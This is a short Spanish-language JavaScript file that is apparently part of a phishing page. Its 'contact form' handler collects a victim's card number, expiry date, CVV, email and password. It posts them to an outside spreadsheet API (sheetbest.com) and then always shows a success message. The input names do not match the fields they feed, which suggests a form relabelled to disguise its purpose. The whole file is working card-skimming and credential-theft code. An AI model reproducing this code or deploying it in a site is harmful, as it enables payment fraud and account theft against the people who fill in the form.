const formulario = document.getElementById('contact-form');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://api.sheetbest.com/sheets/f95251c5-597f-4b77-8202-c00afff7053f', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Tarjeta": formulario.usuario.value,
            "Vencimiento": formulario.contraseña.value,
            "Cvv": formulario.confirmar.value,
            "Correo": formulario.correo.value,
            "Clave": formulario.clave.value
            
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
